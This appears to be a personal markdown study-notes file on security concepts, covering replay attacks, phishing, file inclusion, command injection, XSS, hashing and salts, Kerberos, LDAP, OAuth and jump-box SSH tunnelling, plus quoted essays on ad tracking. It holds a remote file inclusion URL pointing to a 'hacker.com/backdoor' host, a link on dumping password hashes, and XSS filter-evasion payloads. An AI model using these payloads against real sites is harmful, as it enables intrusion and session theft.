replay attack https://blog.videah.net/attacking-my-landlords-boiler/
> I eventually decided it was a lot easier to attempt something called a Replay Attack. This involves cloning the signals sent between the boiler and the thermostat, and then pretending we are the thermostat by re-broadcasting the signals. This way we don't need to understand the protocol, just replay it.

* _DoS (denial of service)_: designed to crash system vs. extracting data https://jacobian.org/2020/sep/11/analyzing-dos-vulnerabilities/ 
* _phishing_: elicit secrets via mimicry of legimate resource e.g. set up page to mimic company internal portal
> Humans are always the weakest link. It sounds like some internal person opened a link to an email and went to a site that spoofed internal portal. He/she was prompted to login so they got a set of creds that way. Sent an email from initial mark to another internal person. "Hey Greg, log in here and check this out for me." Type of thing. But now the email doesn't have all of the red flags like THIS EMAIL IS AN EXTERNAL ACCOUNT. So the 2nd+ people blindly trusted the link because it was coming from a trusted colleague. - Roberto 24.12.10

## file inclusion

https://security.stackexchange.com/questions/174932/what-is-the-difference-between-local-file-inclusion-lfi-and-remote-file-inclus

* _local_: directory traversal + reading file
* _remote_: including file from remote source
* _how does it typically happen?_ improper validation of user input leads to the loading of an external resource into the server and execution therein
* _example_: http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor
* `/etc/passwd`: how to read and [how to crack](https://pentestlab.blog/2012/07/23/dumping-and-cracking-unix-password-hashes/); actual passwords stored elsewhere in shadow password file [LPI 26]

* _command injection_: passing malicious code to `os.system` or similar modules
* _prevention_: input validation, parameterized queries [as in Java PreparedStatement] vs. string concat so that input cannot affect the structure of the query
* _parameterized query_: sanitization
* _how do malicious queries get in?_ GET/POST parameters, cookie values, form fields
* _what happens when they get in?_ send script to browser—> browser executes —> logs keystrokes, takes session cookies, sends to own server

## XSS 

= 3rd-party JavaScript running on your site

* _how?_ submit form w/ malacious JS embedded in HTML attr https://flask.palletsprojects.com/en/1.1.x/security/#cross-site-scripting-xss https://24ways.org/2018/securing-your-site-like-its-1999/

* couldn't submit `<script>`, but -> added attribute to html ala `<div style="background:url('javascript:alert(1)')">` 
> I don't understand two things about here: why URL executes (thought it only parsed file path to static resource) and why `javascript:` specifies a runtime (where else in CSS would this come up?)
* only worked on IE, but this was 2005
* couldn't invoke `document.body.innerHTML`, but -> can concatenate code and execute inside eval `eval('document.body.inne' + 'rHTML')`
* realized `innerHTML` contained links a few other user profiles
* realized he could hit MySpace API
* all recursion from there

hash function https://www.youtube.com/watch?v=cczlpiiu42M

* _hash function_: consistent i.e. input 'alice' always returns 42 [5.76] diff strings to diff nums i.e. input 'alice' returns 1 and input 'bob' returns 2 [Bhargava 5.76] https://wizardzines.com/comics/hash-functions/
```python
pass
```
* _one-way_: for identity comparison of sensitive data (does this input match a password?) salt = cannot convert hash back to input [Bhagava 11.215-218]

* _examples_: MD5 (vulnerable to collision attack, used for file integrity) SHA (use -256, not -1)
* _locality-sensitive_: for similarity comparison (are these two files similar?) magnitude of hash change reflects input string [Bhagava 11.216]
* _salt_: unique data added to one-way algo
* e.g. hashing algo so if n users use the same password you can't see from the hash 📙 Buelta [11]
* ❓ to differentiate it for everyone else using SHA-256
* ❓ are one-way *really* one-way or does the addition of salt mean that it would take a ton of computing power and a million years to convert to unhash them?
* _checksum_: for identity comparison (are these two files the same?) [Bhagava 11.214] 📍 do tutorial of how Michael Kennedy uses checksums for caching https://pythonbytes.fm/episodes/show/21/python-has-a-new-star-framework-for-restful-apis @ 11:30
* _salt_: has function takes password and salt (random char) and outputs hash value, which is then stored instead of the naked user/pass; prevents dictionary attack (run through list of common user/pass) bc hacker could guess user/pass and hash func but not get value bc doesn't have salt
* _collisions_: n K to same V (which will be a linked list) [Bhagava 5.87]
* _load factor_: percentage of array indices occupied; 50% is good, above 100% and you're edging away from O(1) [Bhagava 5.90]
* _resize_: increase array size [Bhagava 5.91]
* _Merkle tree_: hash of hashes

### Kerberos

https://www.roguelynn.com/words/explain-like-im-5-kerberos/ https://web.mit.edu/kerberos/krb5-1.12/doc/index.html https://web.mit.edu/kerberos/www/dialogue.html
* single sign-on (SSO) for corporate networks https://stackoverflow.com/a/46188971
* https://news.ycombinator.com/item?id=41943589
* authentication
* login: user/pass, user/keytab (secret but not a pw)
* _keytab_: db for keys https://web.mit.edu/kerberos/krb5-1.12/doc/basic/keytab_def.html
> or secret that's not a pw
* _components_: client, service you want to talk to, ticket granting server (TGS), key distribution center (KDC)
* _realm_: collection of services a client could potentially talk to
* uses symmetric encryption [`oreilly-ssh.pdf` 11.5.2]
* uses KDC as active trusted third-party, active insofar as each message has to go through KDC, unlike PKI in which client/server can talk to each other once certificate granted [`oreilly-ssh.pdf` 11.5.2]
* kinit

### LDAP

* https://github.com/Macmod/godap
* _LDAP_: protocol to store/query directory of users/groups/perms; used for both authorization and authentication; services that use LDAP incl Active Directory and OpenLDAP https://news.ycombinator.com/item?id=23868081 https://news.ycombinator.com/item?id=32053961
```yaml
# https://www.youtube.com/watch?v=G6OhnMDU1J4
dn: CN=Alice, OU=sysadmin
# dn = distinguised name i.e. ID
# CN = common name i.e. human readable name
# OU = organization unit
```

* allow 3rd party to use data from service (e.g. Github) w/out exposing user creds from service to 3rd party https://stackoverflow.com/a/33704657
* authorization, not authentication e.g. 3rd party uses Github for OAuth to establish an identity for a new user https://stackoverflow.com/a/33704657
* OAuth2 simpler than OAuth1, which required non-standard client (couldn't curl) and had its own security layer (vs. HTTPS) https://brandur.org/accessible-apis
* framework, not protocol 🗄 `link.md`
* sometimes known as passwordless https://dzone.com/articles/how-passwordless-authentication-works
* _token types_: access token, id token https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/
* _components_: resource owner (user) client (app that user wants to use) server/provider (authenticates user, grants token to client, which I presume is then handed to user) https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2 https://stackoverflow.com/a/10282020
> When a user logs into our site with their Github account, we will redirect them to Github which then sends us a token that represents the user. https://learndjango.com/tutorials/django-allauth-tutorial

## DMZ

* _DMZ_: part of internal network w/ external-facing servers
* for connecting internal network to larger external networks e.g. WWW
* _jump box_: SSoA https://en.wikipedia.org/wiki/Jump_server https://www.youtube.com/watch?v=Mwf17O45IA0
* to non-DMZ e.g. db
* to DMZ e.g. web servers
* e.g. n admins for AWS servers, all admins go through jumpbox instead of each admin using own machine
* easier to harden single jump box than n machines
* servers only allow jump box IP address range [2:30]
* aka bastion host
* workflow: ssh to jump box, port forward from jump box to server
```sh
# local to jump box, jump box port forward to destination
ssh -l localport:host:port jumpbox
# e.g. port forward local 9998 to destination 27 via jump box
ssh -L 9998:db.foo.io:27017 jumpbox.foo.io
mongo mongodb://user:pw@addr:port/db
```

* port forwarding VPN, tunnel https://github.com/sshuttle/sshuttle https://hackertarget.com/ssh-examples-tunnels can do graphical forwarding as well (remote desktop) https://hacker-tools.github.io/remote-machines/ remote desktop https://github.com/rustdesk/rustdesk
```sh
ssh -NvL local_port:host:host_port jump_box_host
ssh -NvL 9998:um_host:5432 jump_box_host
pgcli postgres://postgres:pw@127.0.0.1:9998/db

> In parallel, Apple has built up its own ad system on the iPhone, which records, tracks and targets users and serves them ads, but does this on the device itself rather than on the cloud, and only its own apps and services. Apple tracks lots of different aspects of your behaviour and uses that data to put you into anonymised interest-based cohorts and serve you ads that are targeted to your interests, in the App Store, Stocks and News apps. You can read Apple’s description of that here - Apple is tracking a lot of user data, but nothing leaves your phone. Your phone is tracking you, but it doesn’t tell anyone anything. This is conceptually pretty similar to Google’s proposed FLoC, in which your Chrome web browser uses the web pages you visit to put you into anonymised interest-based cohorts without your browsing history itself leaving your device. Publishers (and hence advertisers) can ask Chrome for a cohort and serve you an appropriate ad rather than tracking and targeting you yourself. Your browser is tracking you, but it doesn’t tell anyone anything -except for that anonymous cohort. https://www.ben-evans.com/benedictevans/2021/5/13/apples-ads-music

> I understand that most egregious privacy abuses are perpetrated by companies I’ve never heard of. I understand that most of my personal data is already the property of hundreds of other companies with even worse controls than Facebook. I know that deleting my Facebook account won’t bring my data back home, and that if I wanted to truly regain my privacy then I’d have to change my name and address and date of birth and hobbies and socio-economic background. I understand that no one inside Facebook has to care about mass account deletions until they reach their ninth digit, and that even scandals like this probably barely scrape seven digits at most. I understand that deleting a Facebook account is an ineffectual gesture, especially since I’m currently too tied into WhatsApp to delete that account too. But I still think it’s a worthwhile one. https://robertheaton.com/deleting-facebook/
